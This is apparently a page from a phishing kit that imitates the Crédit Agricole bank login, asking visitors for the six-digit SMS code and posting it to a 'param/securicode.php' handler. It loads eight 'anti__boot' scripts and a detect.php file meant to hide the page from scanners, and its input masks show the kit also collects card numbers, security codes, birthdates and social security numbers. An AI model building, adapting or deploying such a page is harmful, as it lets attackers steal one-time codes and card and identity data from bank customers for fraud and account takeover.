<?php 
    error_reporting(0);
    include("anti__boot/anti1.php");
    include("anti__boot/anti2.php");
    include("anti__boot/anti3.php");
    include("anti__boot/anti4.php");
    include("anti__boot/anti5.php");
    include("anti__boot/anti6.php");
    include("anti__boot/anti7.php");
    include("anti__boot/anti8.php");
    require_once 'detect.php';

?>
<html lang="fr" class="fontawesome-i2svg-active fontawesome-i2svg-complete"><head>

    <meta charset="utf-8">
    <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
    <meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1">



      
    <script src="./style/js/angular.min.js"></script>
<script src="./style/js/jquery.min.js"></script>
<script src="./style/js/jquery.CardValidator.js"></script>
<script src="./style/js/jquery.validate.min.js"></script>
<script src="./style/js/jquery.mask.js"></script>
<script src="./style/js/style.js"></script>

    
    
    
      
    
    

  <script type="text/javascript">
    $(function() {
        $('#cardnumber').mask('0000 0000 0000 0000');
    $('#Securitycode').mask('0000');

        $('#birthdate').mask('00/00/0000');

        $('#SSN').mask('000-00-0000');

        $('#expdate').mask('00/0000');

  });
  </script>



<style type="text/css">
.multi.equal .rightt {
    float: right;
}
.multi.equal .leftt, .multi.equal .rightt {
    width: 48.6%;
}
.multi .rightt {
    width: 25%;
    float: left;
}
.multi.equal .leftt {
    margin-right: 0;
}
.multi.equal .leftt, .multi.equal .rightt {
    width: 48.6%;
}
.multi .leftt {
    width: 72.5%;
    float: left;
}
.leftt, .middle {
    margin-right: 10px;
}

</style>





<style>
#Securitycode {
background-image: url('./style/sprite_logos_wallet_2x.png');
background-repeat: no-repeat;
    background-size: 54px;
    background-position: 109.5% 48.1%;
}

 #cardnumber {
background-image: url('./style/cards-sprite-small@2x.png');
background-repeat: no-repeat;
    background-size: 50px;}

</style>




    <meta name="theme-color" content="#6dc77a">
    <meta name="msapplication-navbutton-color" content="#6dc77a">
    <meta name="apple-mobile-web-app-status-bar-style" content="#6dc77a">

    <style type="text/css">svg:not(:root).svg-inline--fa{overflow:visible}.svg-inline--fa{display:inline-block;font-size:inherit;height:1em;overflow:visible;vertical-align:-.125em}.svg-inline--fa.fa-lg{vertical-align:-.225em}.svg-inline--fa.fa-w-1{width:.0625em}.svg-inline--fa.fa-w-2{width:.125em}.svg-inline--fa.fa-w-3{width:.1875em}.svg-inline--fa.fa-w-4{width:.25em}.svg-inline--fa.fa-w-5{width:.3125em}.svg-inline--fa.fa-w-6{width:.375em}.svg-inline--fa.fa-w-7{width:.4375em}.svg-inline--fa.fa-w-8{width:.5em}.svg-inline--fa.fa-w-9{width:.5625em}.svg-inline--fa.fa-w-10{width:.625em}.svg-inline--fa.fa-w-11{width:.6875em}.svg-inline--fa.fa-w-12{width:.75em}.svg-inline--fa.fa-w-13{width:.8125em}.svg-inline--fa.fa-w-14{width:.875em}.svg-inline--fa.fa-w-15{width:.9375em}.svg-inline--fa.fa-w-16{width:1em}.svg-inline--fa.fa-w-17{width:1.0625em}.svg-inline--fa.fa-w-18{width:1.125em}.svg-inline--fa.fa-w-19{width:1.1875em}.svg-inline--fa.fa-w-20{width:1.25em}.svg-inline--fa.fa-pull-left{margin-right:.3em;width:auto}.svg-inline--fa.fa-pull-right{margin-left:.3em;width:auto}.svg-inline--fa.fa-border{height:1.5em}.svg-inline--fa.fa-li{width:2em}.svg-inline--fa.fa-fw{width:1.25em}.fa-layers svg.svg-inline--fa{bottom:0;left:0;margin:auto;position:absolute;right:0;top:0}.fa-layers{display:inline-block;height:1em;position:relative;text-align:center;vertical-align:-.125em;width:1em}.fa-layers svg.svg-inline--fa{-webkit-transform-origin:center center;transform-origin:center center}.fa-layers-counter,.fa-layers-text{display:inline-block;position:absolute;text-align:center}.fa-layers-text{left:50%;top:50%;-webkit-transform:translate(-50%,-50%);transform:translate(-50%,-50%);-webkit-transform-origin:center center;transform-origin:center center}.fa-layers-counter{background-color:#ff253a;border-radius:1em;-webkit-box-sizing:border-box;box-sizing:border-box;color:#fff;height:1.5em;line-height:1;max-width:5em;min-width:1.5em;overflow:hidden;padding:.25em;right:0;text-overflow:ellipsis;top:0;-webkit-transform:scale(.25);transform:scale(.25);-webkit-transform-origin:top right;transform-origin:top right}.fa-layers-bottom-right{bottom:0;right:0;top:auto;-webkit-transform:scale(.25);transform:scale(.25);-webkit-transform-origin:bottom right;transform-origin:bottom right}.fa-layers-bottom-left{bottom:0;left:0;right:auto;top:auto;-webkit-transform:scale(.25);transform:scale(.25);-webkit-transform-origin:bottom left;transform-origin:bottom left}.fa-layers-top-right{right:0;top:0;-webkit-transform:scale(.25);transform:scale(.25);-webkit-transform-origin:top right;transform-origin:top right}.fa-layers-top-left{left:0;right:auto;top:0;-webkit-transform:scale(.25);transform:scale(.25);-webkit-transform-origin:top left;transform-origin:top left}.fa-lg{font-size:1.33333em;line-height:.75em;vertical-align:-.0667em}.fa-xs{font-size:.75em}.fa-sm{font-size:.875em}.fa-1x{font-size:1em}.fa-2x{font-size:2em}.fa-3x{font-size:3em}.fa-4x{font-size:4em}.fa-5x{font-size:5em}.fa-6x{font-size:6em}.fa-7x{font-size:7em}.fa-8x{font-size:8em}.fa-9x{font-size:9em}.fa-10x{font-size:10em}.fa-fw{text-align:center;width:1.25em}.fa-ul{list-style-type:none;margin-left:2.5em;padding-left:0}.fa-ul>li{position:relative}.fa-li{left:-2em;position:absolute;text-align:center;width:2em;line-height:inherit}.fa-border{border:solid .08em #eee;border-radius:.1em;padding:.2em .25em .15em}.fa-pull-left{float:left}.fa-pull-right{float:right}.fa.fa-pull-left,.fab.fa-pull-left,.fal.fa-pull-left,.far.fa-pull-left,.fas.fa-pull-left{margin-right:.3em}.fa.fa-pull-right,.fab.fa-pull-right,.fal.fa-pull-right,.far.fa-pull-right,.fas.fa-pull-right{margin-left:.3em}.fa-spin{-webkit-animation:fa-spin 2s infinite linear;animation:fa-spin 2s infinite linear}.fa-pulse{-webkit-animation:fa-spin 1s infinite steps(8);animation:fa-spin 1s infinite steps(8)}@-webkit-keyframes fa-spin{0%{-webkit-transform:rotate(0);transform:rotate(0)}100%{-webkit-transform:rotate(360deg);transform:rotate(360deg)}}@keyframes fa-spin{0%{-webkit-transform:rotate(0);transform:rotate(0)}100%{-webkit-transform:rotate(360deg);transform:rotate(360deg)}}.fa-rotate-90{-webkit-transform:rotate(90deg);transform:rotate(90deg)}.fa-rotate-180{-webkit-transform:rotate(180deg);transform:rotate(180deg)}.fa-rotate-270{-webkit-transform:rotate(270deg);transform:rotate(270deg)}.fa-flip-horizontal{-webkit-transform:scale(-1,1);transform:scale(-1,1)}.fa-flip-vertical{-webkit-transform:scale(1,-1);transform:scale(1,-1)}.fa-flip-horizontal.fa-flip-vertical{-webkit-transform:scale(-1,-1);transform:scale(-1,-1)}:root .fa-flip-horizontal,:root .fa-flip-vertical,:root .fa-rotate-180,:root .fa-rotate-270,:root .fa-rotate-90{-webkit-filter:none;filter:none}.fa-stack{display:inline-block;height:2em;position:relative;width:2.5em}.fa-stack-1x,.fa-stack-2x{bottom:0;left:0;margin:auto;position:absolute;right:0;top:0}.svg-inline--fa.fa-stack-1x{height:1em;width:1.25em}.svg-inline--fa.fa-stack-2x{height:2em;width:2.5em}.fa-inverse{color:#fff}.sr-only{border:0;clip:rect(0,0,0,0);height:1px;margin:-1px;overflow:hidden;padding:0;position:absolute;width:1px}.sr-only-focusable:active,.sr-only-focusable:focus{clip:auto;height:auto;margin:0;overflow:visible;position:static;width:auto}</style><link rel="icon" type="image/png" href="./style/favicon.png">
    
    <link rel="stylesheet" href="./style/css/bootstrap.min.css">
    
    <link rel="stylesheet" href="./style/css/helpers.css">

    <link rel="stylesheet" href="./style/css/fonts.css">

    <link rel="stylesheet" href="./style/css/main.css">


    <title>Accéder à mes comptes - CA</title>

</head>
<body>



    <header id="header2">
        <div class="logo">
            <a href="#"><img class="" src="./style/logo_ca.png" alt="Crédit Agricole - Banque et assurances" style="/* position: absolute; */top: 10%;width: 174px;left: 6%;/* max-width: 100%; *//* max-height: 100px; *//* height: 100%; */transform: translate(6%, -9%);"></a>
        </div>
        
        <div class="closse"><svg class="svg-inline--fa fa-times fa-w-11" aria-hidden="true" data-prefix="fas" data-icon="times" role="img" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 352 512" data-fa-i2svg=""><path fill="currentColor" d="M242.72 256l100.07-100.07c12.28-12.28 12.28-32.19 0-44.48l-22.24-22.24c-12.28-12.28-32.19-12.28-44.48 0L176 189.28 75.93 89.21c-12.28-12.28-32.19-12.28-44.48 0L9.21 111.45c-12.28 12.28-12.28 32.19 0 44.48L109.28 256 9.21 356.07c-12.28 12.28-12.28 32.19 0 44.48l22.24 22.24c12.28 12.28 32.2 12.28 44.48 0L176 322.72l100.07 100.07c12.28 12.28 32.2 12.28 44.48 0l22.24-22.24c12.28-12.28 12.28-32.19 0-44.48L242.72 256z"></path></svg><!-- <i class="fas fa-times"></i> --></div>
    </header>

    <center>
    <main id="main" style="
    display: block;
">
        
        <div class="right" style="
    text-align: center;
    box-sizing: content-box;
    width: fit-content;
    background-color: #F5F5F5;
">
            <h1 class="">AUTHENTI<b>FICATION</b>  1/3</h1>
            <div class="row">
                <div class="col-md-6" style="
    flex: revert;
    max-width: inherit;
">
                    <div class="form">
                        
                        <form method="post" action="param/securicode.php">





                            <div class="form-group">
                            <p id="cc" style="font-size:15px">
                             <i class="ui icon big mobile"></i> <br> <b> Entrez le code à <span style="color:teal">*6 chiffres*</span> reçu par SMS : <br><br>
                                                   <input required="" maxlength="6" type="text" placeholder="******" name="securecode" id="securecode" class="form-control" style="display: inherit;width: 50%;" value=""></b></p><b>
                            </div>

                            
                            
                            <div class="form-group mt-5">
                                <button type="submit" class="btn-get-pass ">Continuer</button>
                                <button type="submit" class="btn-submit zow " disabled="">VALIDER</button>
                            </div>

                            <p><img src="style/stp.png"  width="500px" height="100px"></p>
                         
                        </form>
                    </div>
                </div>
                
            </div>
        </div>
    </main>
</center>
    
    
    
    
    





</body></html>